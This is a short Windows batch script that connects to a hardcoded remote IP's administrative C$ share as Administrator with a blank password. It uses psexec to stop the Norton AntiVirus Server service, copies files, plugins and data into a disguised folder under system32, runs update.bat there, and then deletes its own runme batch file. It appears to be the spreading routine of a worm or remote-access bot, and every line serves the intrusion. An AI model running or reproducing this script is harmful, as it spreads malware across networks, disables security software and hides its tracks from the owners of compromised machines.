net use w: /delete
net use \\213.67.22.78 /USER:Administrator
net use w: \\213.67.22.78\C$
psexec \\213.67.22.78 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\213.67.22.78 -u Administrator -p "" -c temp.bat
mkdir w:\winnt\system32\rmtcfg
mkdir w:\winnt\system32\catroot
copy copy\* w:\winnt\system32\rmtcfg
mkdir w:\winnt\system32\rmtcfg\files
mkdir w:\winnt\system32\rmtcfg\files\copy
mkdir w:\winnt\system32\rmtcfg\files\dat
mkdir w:\winnt\system32\rmtcfg\files\log
mkdir w:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\system32\rmtcfg\files\* w:\winnt\system32\rmtcfg\files
copy copy\* w:\winnt\system32\rmtcfg\files\copy
copy plugin\* w:\winnt\system32\rmtcfg\files\plugin
copy dat\* w:\winnt\system32\rmtcfg\files\dat
psexec \\213.67.22.78 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use w: /delete
net use \\213.67.22.78 /delete
del runme754881.bat
